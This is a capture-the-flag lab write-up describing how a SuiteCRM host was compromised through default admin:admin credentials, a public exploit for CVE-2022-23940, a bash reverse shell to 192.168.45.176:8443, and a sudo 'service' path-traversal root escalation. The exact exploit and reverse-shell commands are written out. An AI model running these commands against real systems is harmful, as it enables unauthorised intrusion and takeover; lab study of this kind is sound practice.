CTF-200-01

Target IP: 192.168.250.146
Challenge Description: N/A.

Reconnaissance


Performing a port scan against the target machine shows there are four TCP ports open on the target machine, as shown above.


Performing an aggressive port scan against the open ports returns the result above. Are there two MySQL database applications on the target machine? I will start enumeration with the HTTP application on port 80.

Enumeration

Port 80: HTTP

Browsing to http://192.168.250.146 displays the login webpage above. It looks like the target machine is using Suite CRM. This application is written in PHP, and is used to create functional database applications.


I Googled the default credentials for this application and found out it uses admin:admin. And voila! Using the default credentials admin:admin I gained access to the CRM application on this port, as shown above. Time to enumerate further.


The target machine is using the application version 7.12.3 as shown above. This application is also powered by Sugar CRM and its version is 6.5.25, as shown above.


However, doing a Google search for these application version shows the interesting result above. It looks like the application is vulnerable to RCE as it falls in the version range of 7.12.1 and 8.0.1. This vulnerability has the CVE of CVE-2022-23940.


When searching for CVE-2022-23940 on Google, I found the Github repository above. This contains the Python exploit for the application. Before launching the exploit, I wish to enumerate a bit more.


While performing a directory search, I browsed to /robots.txt and found out it has one allowed entry called /ical_server.php. Using the default credentials, admin:admin, I logged in successfully. This initiated a file download called ical_server.ics which contains information about the application & target machine. After doing a directory search, I obtained tons of information which were not very useful. Time to exploit it now.

Exploitation


I downloaded the exploit on my machine and ran it against the target machine using the command python3 exploit.py -h http://192.168.250.146/ -u admin -p admin -P 'id'. I set the payload to obtain the id of the user on the target machine.


Then I viewed the latest scheduled report called test and found the payload id was executed successfully, as shown above! It looks like the user that executed is www-data which makes sense. Time to obtain a reverse shell connection now.


And bingo! In the picture above there are two terminals. The top terminal is where I deploy the bash reverse shell payload bash -c "/bin/bash -i >& /dev/tcp/192.168.45.176/8443 0>&1" using the exploit. The exploit command I used is python3 exploit.py -h http://192.168.250.146/ -u admin -p admin -P 'bash -c "/bin/bash -i >& /dev/tcp/192.168.45.176/8443 0>&1"'. And on the bottom terminal, I obtain a reverse shell connection on my machine at port 8443 with the session as the user www-data. Before launching the exploit, I started a listener on my machine at port 8443. Now I have a foothold on the target machine.

Privilege Escalation


Running sudo -l shows the command /usr/sbin/service can be executed as the user root without password.


To obtain a root shell, I changed directory to /usr/sbin and executed the command sudo service ../../bin/sh. Now I have root level access on the target machine as shown above.

Flags


The local.txt flag is shown above. This flag is located at /var/www/html directory.


The proof.txt flag is shown above. This flag is accessible after exploiting the misconfigured service binary to spawn a root shell.
